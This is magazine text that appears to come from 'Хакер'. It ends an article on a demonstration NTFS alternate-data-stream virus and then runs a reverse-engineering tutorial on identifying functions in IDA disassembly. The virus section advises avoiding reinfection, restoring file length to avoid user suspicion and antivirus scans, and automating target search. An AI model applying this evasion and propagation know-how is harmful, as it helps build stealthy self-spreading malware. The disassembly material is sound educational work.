показанное на рисунке, а пос ле нажатия на кноп ку ОK передает управление
оригинальному коду программы.





  Диалоговое окно, отоб ража емое зараженным файлом при запуске
  на исполне ние


             INFO

                       Чтобы фокус сработал в Windows 10, вирус дол‐
                     жен быть запущен от име ни администра тора.


Чтобы не возбуждать у пользователя подозрений, настоящий вирусописатель
удалит это диалоговое окно из финальной версии вируса, заменив его
какой‐нибудь вредоносной начинкой. Тут все зависит от вирусописательских
намерений и фантазии. Например, можно перевернуть  экран, сыграть
над пользователем еще какую‐нибудь безобидную шутку или же заняться
более зловредной деятельностью вроде похищения паролей или дру гой кон‐
фиденциальной информации.
  Зараженный файл обладает всеми необ ходимыми репродуктивными спо‐
собностями и может заражать другие исполняемые файлы. Например, чтобы
заразить игру Solitaire, следует дать команду notepad.exe  ‐‐*  sol.exe.
Кстати говоря, ни один пользователь в здравом уме не будет самостоятельно
заражать файлы через командную строку. Поэтому вирусописатель должен
будет разработать процедуру поиска очередного кандидата на заражение.


           WARNING

                   До сих пор рассматриваемый вирус действитель‐
                      но был абсолютно безобиден. Он не размножает‐
                        ся  и  не  выполняет  никаких  злонамеренных
                      или деструктивных действий. Ведь он создан
                     лишь для демонстрации потенциальной  опас‐
                         ности,  подстерегающей  пользователей  NTFS.
                      Исследовательская деятельность преступлением
                      не является. Но вот если кто‐то из вас решит
                      доработать вирус так, что бы он самостоятельно
                       размножался и совершал вредоносные действия,
                         то следует напомнить, что это уже станет уголов‐
                      но наказуемым деянием.


Так что вместо разработки вредоносной начинки будем совершенс твовать
вирус в другом направлении. При повторном заражении файла текущая вер‐
сия необратимо затирает оригинальный код своим телом, в результате чего
файл станет неработос пособным. Вот беда! Как же ее побороть? Можно
добавить проверку на зараженность перед копированием вируса в файл.
Для этого следует вызвать функцию CreateFile, передать ей имя файла
вместе с потоком (например, notepad.exe:bar) и проверить результат. Если
файл открыть не удалось, зна чит, потока bar этот файл не содержит и, сле‐
довательно, он еще не заражен. Если же файл удалось успешно открыть, сто‐
ит отказаться от заражения или выбрать другой поток. Например: bar_01,
bar_02, bar_03.
  Еще одна проблема заключа ется в том, что вирус не корректирует длину
целевого файла и после внедрения она станет равной 4 Кбайт (именно таков
размер текущей версии исполня емо го файла  вируса). Это плохо,  так
как пользователь  тут же заподоз рит подвох (файл  explorer.exe, занима‐
ющий 4 Кбайт, выглядит довольно забавно), занервничает и начнет запус кать
антивирусы. Чтобы устранить этот недос таток, мож но запомнить длину инфи‐
цируемого файла перед внедрением, затем скопировать в основной поток
тело вируса, открыть файл на запись и вызвать функцию SetFilePointer
для установки указателя на оригинальный размер, увеличивая размер инфи‐
цированного файла до исходно го зна чения.


ЗАКЛЮЧЕНИЕ
Предложенная  стратегия  внедрения,  конечно,  неидеальна, но  все же
это намного лучше, чем прописываться в реестре, который контролируется
множеством утилит мониторин га. Наконец, чтобы не пос традать от своего же
собственного  вируса,  каж дый  вирусописа тель  всегда  дол жен  иметь
под рукой противоядие. Командный файл, приведенный в следующем лис‐
тинге, извлекает оригинальное содержимое файла из потока bar и записы‐
вает его в файл reborn.exe.


more < %1:bar > reborn.exe
ECHO I’m reborn now!

Используй  полученные  знания  с  осто рожностью,  изучай  ассемблер,
не забывай мыть руки перед едой и всегда помни о том, что соз дание
вирусов в каких‐либо иных целях, кроме исследовательских, не только очень
веселое, но еще и противозаконное занятие. А закон, как любил говорить
один литературный пер сонаж, надо чтить!
ВЗЛОМ

ФУНДАМЕНТАЛЬНЫЕ
ОСНОВЫ
ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.


УЧИМСЯ ИСКАТЬ
КЛЮЧЕВЫЕ СТРУКТУРЫ                   Юрий Язев
                                                                      Широко известен под
                                                                          псевдонимом yurembo.ЯЗЫКОВ                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый авторВЫСОКОГО УРОВНЯ                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





Исследование алгоритма работы программ, написан ных
на  языках  высоко го  уровня,  традиционно  начинается
с реконструкции ключевых струк тур исходного языка — фун‐
кций, локальных и гло бальных перемен ных, ветвлений, цик‐
лов и так далее. Это дела ет дизассемблированный листинг
более наглядным и зна чительно упро щает его анализ.


Фун дамен таль ные осно вы хакерс тва
Пятнадцать лет назад эпичес кий труд Криса Кас перски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего иссле дова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из вре мен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2017.
  Читай так же:
 • Проверка аутентичнос ти и базовый взлом защиты
 • Знакомство с отладчиком
 • Продолжаем осваивать отладчик
 • Новые способы находить защитные механизмы в чужих программах
 • Выбираем лучший редактор для вскрытия исполняемых файлов Windows
 • Мастер‐класс по анализу исполняемых файлов в IDA Pro



Современные дизассемблеры достаточно интеллектуальны и львиную долю
распознавания ключевых структур берут на себя. В частности, IDA Pro
успешно справляется с идентификацией стандартных библиотечных функций,
локальных переменных, адресуемых через регистр ESP, case‐ветвлений
и прочего. Однако порой она ошибается, вводя исследователя в заблужде‐
ние, к тому же ее высокая сто имость не всегда оправдывает применение.
Например, студентам, изу чающим ассемблер (а лучшее средство изучения
ассемблера — дизассемблирование чужих программ), она едва ли по кар‐
ману.
  Разумеется, на IDA свет клином не сошелся, существуют и другие дизас‐
семблеры — скажем, тот же DUMPBIN, входящий в штатную пос тавку SDK.
Почему бы на худой конец не воспользоваться им? Конечно, если под рукой
нет ничего лучшего, сойдет и DUMPBIN, но в этом случае об интеллектуаль‐
ности дизассем блера придется забыть и пользоваться исключительно своей
головой.
  Первым делом мы познакомимся с неоптимизирующими компилято‐
рами — анализ их кода относительно прост и вполне доступен для понимания
даже новичкам в программирова нии. Затем же, освоившись с дизассембле‐
ром, перейдем к вещам более сложным — оптимизирующим компиляторам,
генерирующим очень хитрый, запутанный и витиева тый код.
  Поставь любимую музыку, выбери любимый напиток и погрузись в глубины
дизассемблерных листингов.





        Неплохой сборник, как раз для продолжительной работы


ИДЕНТИФИКАЦИЯ ФУНКЦИЙ
Функция (также называемая процеду рой или подпрограммой) — основная
структурная единица процедурных и объектно ориентированных язы ков,
поэтому дизассемблирование кода обычно начинается с отождествле ния
функций и идентификации переда ваемых им аргу ментов.
   Строго говоря, термин «функция» присутству ет не во всех языках, но даже
там, где он присутству ет, его определение варьиру ется от языка к язы ку.
Не вдаваясь в детали, мы будем понимать под функцией обособленную пос‐
ледовательность команд, вызываемую из раз личных час тей программы. Фун‐
кция может принимать один и более аргу ментов, а может не принимать
ни одного; может возвращать результат своей работы, а может и не воз вра‐
щать — это уже не суть важно. Клю чевое свой ство функции — возвращение
управления на место ее вызова, а ее характерный признак — множественный
вызов из различных частей программы (хотя некото рые функции вызываются
лишь из одного места).
  Откуда функция знает, куда следует воз вра тить управле ние? Очевидно,
вызывающий код дол жен предваритель но сохранить адрес возврата и вмес те
с прочими аргументами передать его вызыва емой функции. Существу ет мно‐
жество способов решения этой проб лемы: можно, например, перед вызовом
функции поместить в ее конец безусловный переход на адрес воз врата, мож‐
но сохранить адрес воз вра та в специальной переменной и после завер‐
шения функции выполнить кос венный переход, используя эту переменную
как операнд инструкции jump... Не останавлива ясь на обсуждении сильных
и слабых сторон каждого метода, отметим, что компиляторы в подавляющем
большинстве случаев используют специальные машинные команды CALL
и RET, соответственно предназна ченные для вызова функций и возврата
из них.
  Инструкция CALL закидывает адрес следующей за ней инструкции на вер‐
шину сте ка, а RET стягивает и переда ет на него управление. Тот адрес,
на который указывает инс трукция CALL, и есть адрес начала функции.
А замыкает функцию инструкция RET (но внимание: не всякий RET обозначает
конец функции!).
   Таким образом, рас познать функцию можно двояко: по перекрестным
ссылкам, ведущим к машинной инс трукции CALL, и по ее эпилогу, завер‐
шающемуся инструкцией RET. Перекрес тные ссылки и эпилог в совокупности
позволяют опре делить адреса начала и конца функции. Немного забегая впе‐
ред, заметим, что в начале многих функций присутству ет характерная пос‐
ледовательность команд, называемая про логом, которая также при год на
и для идентификации функций. А теперь рас смотрим все эти темы попод‐
робнее.


Не посредствен ный вызов фун кции
Просматривая дизассемблерный  код, находим все инструкции CALL —
содержимое их операнда и будет искомым адресом начала функции. Адрес
невиртуальных функций, вызываемых по имени, вычисляется еще на стадии
компиляции, и операнд инс трукции CALL в таких случаях представляет собой
непосредственное значение. Благодаря этому адрес начала функции выяв‐
ляется простым син таксическим анализом: ищем контекстным поис ком все
подстроки CALL и запоминаем (записываем) непосредс твенные операнды.
   Рассмотрим сле дующий пример (Listing1 в материалах к статье):


void func();


int main(){
  int a;
  func();
  a=0x666;
  func();
}


void func(){
  int a;
  a++;
}

Компилируем привычным образом:


cl.exe main.cpp /EHcs

Результат компиляции в IDA Pro должен выглядеть приблизительно так:


.text:00401020    push    ebp
.text:00401021    mov     ebp, esp
.text:00401023    push    ecx
.text:00401024    call    sub_401000
.text:00401024    ; Вот мы выловили инструкцию call c
непосредственным операндом,
.text:00401024    ; представляющим собой адрес начала функции.
Точнее — ее смещение
.text:00401024    ; в кодовом сегменте (в данном случае в сегменте .
text).
.text:00401024    ; Теперь можно перейти к строке .text:00401000 и,
дав функции
.text:00401024    ;  собственное имя, заменить операнд инструкции
call на конструкцию
.text:00401024    ;  «call offset Имя моей функции».
.text:00401024    ;
.text:00401029    mov     [ebp+var_4], 666h
.text:00401029    ; А вот наше знакомое число 0x666, присваиваемое
переменной
.text:00401030    call    sub_401000
.text:00401030    ; А вот еще один вызов функции! Обратившись к
строке .text:401000,
.text:00401030    ; мы увидим, что эта совокупность инструкций уже
определена как функция,
.text:00401030    ; и все, что потребуется сделать, — заменить call
401000 на
.text:00401030    ; «call offset Имя моей функции».
.text:00401030    ;
.text:00401035    xor     eax, eax
.text:00401037    mov     esp, ebp
.text:00401039    pop     ebp
.text:0040103A    retn
.text:0040103A    ; Вот нам встретилась инструкция возврата из
функции, однако не факт,
.text:0040103A    ; что это действительно конец функции, — ведь
функция может иметь
.text:0040103A    ; и несколько точек выхода. Однако смотри: следом
за ret расположено
.text:0040103A    ; начало следующей функции. Поскольку функции не
могут перекрываться,
.text:0040103A    ; выходит, что данный ret — конец функции!
.text:0040103A sub_401020      endp
.text:0040103B sub_40103B      proc near               ; DATA XREF: .
rdata:0040D11C?o
.text:0040103B    push    esi
.text:0040103C    push    1
...

Судя по адресам, «наша функция» в лис тинге рас положена выше функции
main:


.text:00401000    push    ebp
.text:00401000    ; На эту строку ссылаются операнды нескольких
инструкций call.
.text:00401000    ; Следовательно, это адрес начала «нашей функции».
.text:00401001    mov     ebp, esp         ; <‐
.text:00401003    push    ecx              ; <‐
.text:00401004    mov     eax, [ebp+var_4] ; <‐
.text:00401007    add     eax, 1           ; <‐ тело «нашей функции»
.text:0040100A    mov     [ebp+var_4], eax ; <‐
.text:0040100D    mov     esp, ebp         ; <‐
.text:0040100F    pop     ebp              ; <‐
.text:00401010    retn                     ; <‐

Как видишь, все очень просто.


Вы зов фун кции по указате лю
Однако задача заметно усложняется, если прог раммист (или компилятор)
использует косвенные вызовы функций, переда вая их адрес в регистре
и динамически вычисляя его (адрес, а не регистр!) на стадии выполнения
программы. Именно так, в час тности, реализова на работа с виртуальными
функциями, однако в любом случае компилятор дол жен каким‐то образом
сохранить адрес функции в коде. Зна чит, его можно найти и вычис лить!
Еще проще загрузить исследуемое при ложение в отладчик, установить
на «подследственную» инс трукцию CALL точку останова  и, дождавшись
всплытия отладчика, посмотреть, по какому адресу она передаст управление.
Рассмотрим сле дующий пример (Listing2):


int func(){
  return 0;
}


int main(){
  int (*a)();
  a = func;
  a();
}

Результат его компиляции должен в общем случае выглядеть так (функция
main):


.text:00401010    push    ebp
.text:00401011    mov     ebp, esp
.text:00401013    push    ecx
.text:00401014    mov     [ebp+var_4], offset sub_401000
.text:0040101B    call    [ebp+var_4]
.text:0040101B    ; Вот инструкция CALL, выполняющая косвенный вызов
функции
.text:0040101B    ; по адресу, содержащемуся в ячейке [ebp+var_4].
.text:0040101B    ; Как узнать, что же там содержится? Поднимем
глазки строчкой выше
.text:0040101B    ; и обнаружим: mov [ebp+var_4], offset sub_401000.
Ага!
.text:0040101B    ; Значит, управление передается по смещению sub_40
1000,
.text:0040101B    ; где располагается адрес начала функции! Теперь
осталось только
.text:0040101B    ; дать функции осмысленное имя.
.text:0040101E    xor     eax, eax
.text:00401020    mov     esp, ebp
.text:00401022    pop     ebp
.text:00401023    retn


Вы зов фун кции по указате лю с комплексным вычислением
целево го адре са
В некоторых, достаточно немногочисленных программах встречается и кос‐
венный вызов функции с комплексным вычислением ее адреса. Рассмотрим
следующий пример (Listing3):


int func_1(){
  return 0;
}


int func_2(){
  return 0;
}


int func_3(){
  return 0;
}


int main(){
  int x;
  int a[3] = {(int) func_1,(int) func_2, (int) func_3}; int (*f)();


  for (x=0;x < 3;x++){
    f = (int (*)()) a[x];
    f();
  }
}

Результат дизассемблирования этого кода в общем случае дол жен выглядеть
так:


.text:00401030     push    ebp
.text:00401031     mov     ebp, esp
.text:00401033     sub     esp, 18h
.text:00401036     mov     eax, ___security_cookie
.text:0040103B     xor     eax, ebp
.text:0040103D     mov     [ebp+var_4], eax
.text:00401040     mov     [ebp+var_10], offset sub_401000
.text:00401047     mov     [ebp+var_C], offset sub_401010
.text:0040104E     mov     [ebp+var_8], offset sub_401020
.text:00401055     mov     [ebp+var_14], 0
.text:0040105C     jmp     short loc_401067
.text:0040105E ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
.text:0040105E
.text:0040105E loc_40105E: ; CODE XREF: sub_401030+4A?j
.text:0040105E     mov     eax, [ebp+var_14]
.text:00401061     add     eax, 1
.text:00401064     mov     [ebp+var_14], eax
.text:00401067
.text:00401067 loc_401067: ; CODE XREF: sub_401030+2C?j
.text:00401067     cmp     [ebp+var_14], 3
.text:0040106B     jge     short loc_40107C
.text:0040106D     mov     ecx, [ebp+var_14]
.text:00401070     mov     edx, [ebp+ecx*4+var_10]
.text:00401074     mov     [ebp+var_18], edx
.text:00401077     call    [ebp+var_18]
.text:0040107A     jmp     short loc_40105E
.text:0040107C ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
.text:0040107C
.text:0040107C loc_40107C: ; CODE XREF: sub_401030+3B?j
.text:0040107C     xor     eax, eax
.text:0040107E     mov     ecx, [ebp+var_4]
.text:00401081     xor     ecx, ebp
.text:00401083     call    @__security_check_cookie@4 ; __secu
rity_check_cookie(x)
.text:00401088     mov     esp, ebp
.text:0040108A     pop     ebp
.text:0040108B     retn

В строке call [ebp+var_18] происхо дит кос венный вызов функции. А что
у нас в [ebp+var_18]? Поднимаем глаза на строку вверх — в [ebp+var_18]
у нас значение edx. А чему равен сам edx? Прок ручиваем еще одну строку
вверх — edx равен содержимому ячейки [ebp+ecx*4+var_10]. Вот дела!
Мало того что нам надо узнать содержимое этой ячейки, так еще и предстоит
вычислить ее адрес!
  Чему равен ECX? Содержимому [ebp+var_14]. А оно чему равно? «Сейчас
выясним...» — бормочем мы себе под нос, прокручивая экран дизассембле‐
ра вверх. Ага, нашли: в стро ке 0x401064 в него загружается содержимое EAX!
Какая радость! И дол го мы будем так блуж дать по коду?
  Конечно, можно, затратив неопределен ное количество времени, усилий
и бодрящего напитка, реконстру ировать весь клю чевой алгоритм целиком
(тем более что мы практичес ки подошли к концу ана лиза), но где гарантия,
что при этом не будут допущены ошибки?
   Гораздо  быстрее  и  надежнее  загрузить  исследуемую  программу
в отладчик, установить бряк на строку text:00401077 и, дождавшись всплы‐
тия  окна  отладчика,  посмотреть,  что  у  нас  расположено  в  ячей ке
[ebp+var_18]. Отладчик будет всплывать трижды, причем каждый раз
показывать новый адрес! Заметим, что определить этот факт в дизассембле‐
ре можно только после полной реконструкции алго ритма.
  Однако не стоит питать излишних иллюзий о мощи отладчика. Программа
может тысячу раз вызывать одну и ту же функцию, а на тысяча первый — выз‐
вать совсем другую. Отладчик бес силен это определить. Ведь вызов такой
функции может произойти в непредска зуемый момент, например при опре‐
деленном  сочетании  времени,  обрабатываемых  программой  данных
и текущей фазы Луны. Ну не будем же мы целую вечность гонять программу
под отладчиком?
  Дизассемблер — дело другое. Полная реконструкция алгоритма позволит
однозначно и гарантированно отследить все адреса косвенных вызовов. Вот
потому дизассем блер и отладчик должны ска кать в одной упряжке!
  Напоследок предлагаю взглянуть на такой учас ток дизас семблированного
листинга:


.text:0040103D     mov     [ebp+var_4], eax
.text:00401040     mov     [ebp+var_10], offset sub_401000
.text:00401047     mov     [ebp+var_C], offset sub_401010
.text:0040104E     mov     [ebp+var_8], offset sub_401020
.text:00401055     mov     [ebp+var_14], 0

Воспользуемся средства ми IDA и посмотрим, что загружается в ячей ки
памяти [ebp+…]. А это как раз адреса трех наших функций, последовательно
размещенных компилятором друг за дружкой:


.text:00401000     push    ebp
.text:00401001     mov     ebp, esp
.text:00401003     xor     eax, eax
.text:00401005     pop     ebp
.text:00401006     retn


.text:00401010     push    ebp
.text:00401011     mov     ebp, esp
.text:00401013     xor     eax, eax
.text:00401015     pop     ebp
.text:00401016     retn


.text:00401020     push    ebp
.text:00401021     mov     ebp, esp
.text:00401023     xor     eax, eax
.text:00401025     pop     ebp
.text:00401026     retn


«Руч ной» вызов фун кции инструк цией JMP
Самый тяжелый случай представляют «ручные» вызовы функции командой
JMP с предварительной засылкой в стек адреса возврата. Вызов через JMP
в общем случае выглядит так: PUSH ret_addrr/JMP func_addr, где ret_ad‐
drr и func_addr — непосредственные или косвенные адреса возврата
и начала функции соот ветственно. Кстати, заметим, что команды PUSH и JMP
не всегда следуют одна за другой и порой бывают раз делены дру гими коман‐
дами.
  Возникает резонный вопрос: чем же так плох CALL и зачем прибегать
к JMP? Дело в том, что функция, вызванная по CALL, после возврата управле‐
ния материнской функции всегда передает управление команде, следующей
за CALL. В ряде случаев (нап ример, при структурной обработке исключений)
возникает необходимость после воз вра та из функции продол жать выпол‐
нение не со следующей за CALL командой, а совсем с другой ветки прог‐
раммы. Тогда‐то и при ходится вручную заносить требуемый адрес возврата
и вызывать дочер нюю функцию через JMP.
  Идентифицировать такие функции очень сложно — контекстный поиск
ничего не дает, поскольку команд JMP, использующихся для локальных
переходов, в теле любой прог раммы очень и очень много — попробуй‐ка
проанализируй их все! Если же это го не сделать, из поля зрения выпадут сра‐
зу две функции — вызываемая функция и функция, на которую передается
управление после возвра та. К сожалению, быстрых решений этой проблемы
не существует, единственная зацепка — вызыва ющий JMP практически всегда
выходит за границы функции, в теле которой он рас положен. Определить же
границы функции можно по эпилогу.
   Рассмотрим сле дующий пример (Listing4):


int funct(){
  return 0;
}


int main(){
  __asm{
    LEA ESI, return_addr
    PUSH ESI
    JMP funct
    return_addr:
  }
}

Результат его компиляции в общем случае должен выглядеть так:


.text:00401010     push    ebp
.text:00401011     mov     ebp, esp
.text:00401013     push    esi
.text:00401014     lea     esi, loc_401020
.text:0040101A     push    esi
.text:0040101B     jmp     sub_401000
...

Смотри, казалось бы, тривиальный условный переход, что в нем такого? Ан
нет! Это не простой переход, это замас кированный вызов функции! Отку да он
следует? Давай‐ка перейдем по смещению sub_401000 и пос мотрим:


.text:00401000     push    ebp
.text:00401001     mov     ebp, esp
.text:00401003     xor     eax, eax
.text:00401005     pop     ebp
.text:00401006     retn

Как ты думаешь, куда этот retn воз вра щает управление? Естес твенно,
по адресу, лежаще му на верхушке стека. А что у нас лежит на стеке? PUSH
EBP из строки 401000, обратно выталкивается инструкцией POP из строки
401005. Возвращаемся назад, к мес ту безус ловного перехода, и начинаем
медленно прокручивать экран дизассемблера вверх, отслеживая все обра‐
щения к стеку. Ага, попалась птичка! Инструкция PUSH ESI из строки 40101A
закидывает на вершину стека содержимое регистра ESI, а он сам, в свою
очередь, строкой выше принимает «на грудь» зна чение loc_401020 — это и
есть адрес начала функции, вызываемой командой JMP (вернее, не адрес,
а смещение, но это не принципиально важно):


.text:00401020     pop     esi
.text:00401021     pop     ebp
.text:00401022     retn


Авто мати чес кая иден тифика ция фун кций
            IDA Proпосредством
Дизассемблер IDA Pro способен ана лизи ровать операнды инструкций CALL,
что позволяет ему автоматичес ки раз бивать программу на функции. Причем
IDA вполне успешно справляется с большинством кос венных вызовов. Между
тем современные версии дизассемблера на раз‐два справляются с ком‐
плексными и «руч ными» вызовами функций командой JMP.





             IDA успешно рас позна ла «ручной» вызов функции



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
            УЧИМСЯ ИСКАТЬ КЛЮЧЕВЫЕ СТРУКТУРЫ
                    ЯЗЫКОВ ВЫСОКОГО УРОВНЯ





Про лог
Большинство неоптимизирующих компиляторов помещают в начало функции
следующий код, называемый прологом:


push   ebp
mov    ebp, esp
sub    esp, xx

В общих чертах назначение пролога сводится к следующему: если регистр
EBP используется для адресации локальных переменных (как час то и бывает),
то перед его исполь зованием он должен быть сохранен в стеке (иначе
вызываемая фун кция «сорвет крышу» материн ской), затем в EBP копиру ется
текущее значение регистра ука зателя вершины стека (ESP) — происходит так
называемое открытие кадра стека, и зна чение ESP уменьшается на раз мер
области памяти, выделенной под локальные переменные.
  Последовательность PUSH EBP/MOV EBP,ESP/SUB ESP,xx может служить
хорошей сигнатурой для нахождения всех функций в исследуемом файле,
вклю чая и те, на которые нет пря мых ссылок. Такой при ем, в час тности,
использует в своей работе IDA Pro, одна ко оптимизи рующие компиляторы
умеют адресовать локальные переменные через регистр ESP и используют
EBP как и любой другой регистр общего наз начения. Пролог оптимизирован‐
ных функций состоит из одной лишь команды SUB ESP, xxx — последова‐
тельность слишком корот кая для использования ее в качес тве сигнатуры фун‐
кции, увы. Более подробный рас сказ об эпилогах функций нас ждет впереди.


Эпилог
В конце своей жизни функция закрывает кадр стека, переме щая указатель
вершины стека «вниз», и восстанавлива ет прежнее значение EBP (если только
оптимизирующий компилятор не адресовал локальные переменные через
ESP, используя EBP как обычный регистр общего назначения). Эпи лог фун‐
кции может выглядеть двояко: либо ESP увеличивает ся на нужное значение
командой ADD, либо в него копиру ется зна чение EBP, указывающее на низ
кадра стека.
  Обобщенный код эпилога функции выглядит так. Эпилог 1:


pop    ebp
add    esp, 64h
retn

Эпилог 2:


mov    esp, ebp
pop    ebp
retn

Важно отметить: между командами POP EBP/ADD ESP, xxx и MOV ESP,EBP/
POP EBP могут находиться и другие команды — они необязательно должны
следовать вплот ную друг к другу. Поэто му для поиска эпилогов контекс тный
поиск непригоден — требуется применять поиск по маске.
   Если функция написа на с учетом соглашения Pascal, то ей приходится
самостоятельно очищать стек от аргументов. В подавляющем большинстве
случаев это делается инс трукцией RET n, где n — количество байтов, сни‐
маемых из стека после воз вра та. Функции же, соблюдающие С‐соглашение,
предоставляют очистку стека вызывающему их коду и всегда оканчиваются
командой RET. API‐функции Windows представляют собой комбинацию сог‐
лашений С и Pascal — аргументы заносят ся в стек справа налево, но очищает
стек сама функция.
   Таким образом, RET может служить достаточным признаком эпилога фун‐
кции, но не всякий эпилог — это конец. Если функция име ет в своем теле нес‐
колько операторов return (как часто и быва ет), компилятор в общем случае
генерирует для каждого из них свой собственный эпилог. Необходимо обра‐
тить внимание, находит ся ли за концом эпилога новый пролог, или продол‐
жается код старой функции. Также нельзя забывать и о том, что компиляторы
обычно (но не всегда!) не помещают в исполняемый файл код, никогда
не получающий управления. Иначе говоря, у функции будет все го один эпи‐
лог, а все находящееся пос ле первого return будет выб рошено как ненуж‐
ное.
  Между тем не стоит спешить вперед паровоза. Откомпилируем с парамет‐
рами по умолчанию следующий пример (Listing5):


int func(int a){
  return a++;
  a=1/a;
  return a;
}


int main(){
  func(1);
}

Откомпилированный результат будет выглядеть так (приведен код только
функции func):


.text:00401000     push    ebp
.text:00401001     mov     ebp, esp
.text:00401003     push    ecx
.text:00401004     mov     eax, [ebp+arg_0]
.text:00401007     mov     [ebp+var_4], eax
.text:0040100A     mov     ecx, [ebp+arg_0]
.text:0040100D     add     ecx, 1           ; Производим сложение
.text:00401010     mov     [ebp+arg_0], ecx
.text:00401013     mov     eax, [ebp+var_4]
.text:00401016     jmp     short loc_401027 ; Выполняем безусловный
переход
.text:00401016                              ; на эпилог функции
.text:00401018 ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
.text:00401018     mov     eax, 1
.text:0040101D     cdq
.text:0040101E     idiv    [ebp+arg_0]      ; Код деления единицы на
параметр
.text:00401021     mov     [ebp+arg_0], eax ; остался
.text:00401024     mov     eax, [ebp+arg_0] ; Компилятор не посчитал
нужным его убрать
.text:00401027
.text:00401027 loc_401027:                  ; CODE XREF: sub_40
1000+16?j
.text:00401027     mov     esp, ebp         ; При этом эпилог только
один
.text:00401029     pop     ebp              ;
.text:0040102A     retn

Теперь посмотрим, какой код сгенерирует компилятор, когда внеплановый
выход  из функции происходит при  сра батывании  некоторого  условия
(Listing6):


int func(int a){
  if (a != 0)
    return a++;
  return 1/a;
}


int main(){
  func(1);
}

Результат компиляции (только func):


.text:00401000    push    ebp
.text:00401001    mov     ebp, esp
.text:00401003    push    ecx
.text:00401004    cmp     [ebp+arg_0], 0   ; Сравниваем аргумент
функции с нулем
.text:00401008    jz      short loc_40101E ; Если они равны,
переходим на метку и
.text:00401008                             ; выполняем команду
деления
.text:0040100A    mov     eax, [ebp+arg_0] ; Если же
.text:0040100D    mov     [ebp+var_4], eax ; не равны,
.text:00401010    mov     ecx, [ebp+arg_0] ; то выполняем
.text:00401013    add     ecx, 1           ; инкремент
.text:00401016    mov     [ebp+arg_0], ecx
.text:00401019    mov     eax, [ebp+var_4]
.text:0040101C    jmp     short loc_401027
.text:0040101E ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
.text:0040101E
.text:0040101E loc_40101E:                 ; CODE XREF: sub_40
1000+8?j
.text:0040101E    mov     eax, 1
.text:00401023    cdq
.text:00401024    idiv    [ebp+arg_0]      ; Деление 1 на аргумент
.text:00401027
.text:00401027 loc_401027:                 ; CODE XREF: sub_40
1000+1C?j
.text:00401027    mov     esp, ebp         ; <‐‐ Это явно эпилог
.text:00401029    pop     ebp              ; <‐‐
.text:0040102A    retn                     ; <‐‐

Как и в предыдущем слу чае, компилятор создал толь ко один эпилог. Обрати
внимание: в начале функции в строке 00401004 аргумент сравнивается
с  нулем,  если  условие  выполняет ся,  происхо дит  переход  на  метку
loc_40101E, где выполняется деление, за которым сразу следует эпилог.
Если же условие в строке 00401004 не соб людено, выполняется сложение
и происходит безусловный прыжок на эпилог.


Спе циальное замечание
Начиная с процессора 80286 в наборе команд появились две инструкции EN‐
TER и LEAVE, предназна ченные специально для открытия и закрытия кадра
стека. Однако они практически никог да не используются современными ком‐
пиляторами. Почему?
  Причина в том, что ENTER и LEAVE очень медлительны, намного медлитель‐
нее PUSH EBP/MOV EBP,ESP/SUB ESB, xxx и MOV ESP,EBP/POP EBP. Так,
на старом добром Pentium ENTER выполняет ся за десять тактов, а приведен‐
ная последовательность команд — за семь. Ана логично LEAVE тре бует пять
тактов, хотя ту же операцию можно выполнить за два (и даже быстрее, если
разделить MOV ESP,EBP/POP EBP какой‐нибудь командой).
  Поэтому сов ременный исследователь никогда не столкнется ни с ENTER,
ни с LEAVE. Хотя помнить об их наз начении будет нелишне (мало ли, вдруг
придется дизассемблировать древние программы или программы, написан‐
ные на ассемблере, — не секрет, что многие пишущие на ассемблере очень
плохо знают тонкости работы процессора и их «ручная оптимизация» заметно
уступает компилятору по производительности).


«Голые» (naked) фун кции
Компилятор Microsoft Visual C++ поддержи вает нес тандартный квалификатор
naked, позволяющий программистам соз давать функции без пролога и эпи‐
лога. Компилятор даже не помещает в конце функции RET, и это приходится
делать «вручную», прибегая к ассемблерной вставке __asm{ret} (исполь‐
зование return не приводит к желаемому результату).
  Вообще‐то  поддержка  naked‐функций  задумывалась  исключительно
для написания драйверов на чистом С (с небольшой примесью ассемблер‐
ных включений), но она наш ла неожиданное приз нание и среди разработ‐
чиков защитных механизмов. Действитель но, приятно иметь возможность
«ручного» создания функций, не беспокоясь, что их непредсказуемым обра‐
зом «изуродует» компилятор.
  Для нас же, кодоко пателей, в первом приб лижении это означает, что
в программе может встретиться одна или несколь ко функций, не содержащих
ни пролога, ни эпилога. Ну и что в этом страшного? Опти мизирующие ком‐
пиляторы так же выкидывают пролог, а от эпилога оставляют один лишь RET,
но функции элементарно идентифицируются по вызывающей их инструкции
CALL.


Иден тификация встраиваемых (inline) фун кций
Самый эффективный способ избавиться от накладных расходов на вызов
функций — не вызывать их. В самом деле, почему бы не встроить код функции
непосредственно в саму вызывающую функцию? Конечно, это ощутимо уве‐
личит размер (и тем ощутимее, чем из больших мест функция вызывается),
но зато значительно увеличит скорость выполнения программы (и тем зна‐
чительнее, чем чаще разверну тая функция вызыва ется).
  Чем плоха развертка функций для исследования программы? Прежде все‐
го, она увеличивает размер материнской функции и делает ее код менее наг‐
лядным — вместо CALL\TEST  EAX,EAX\JZ  xxx с бросающимся в глаза
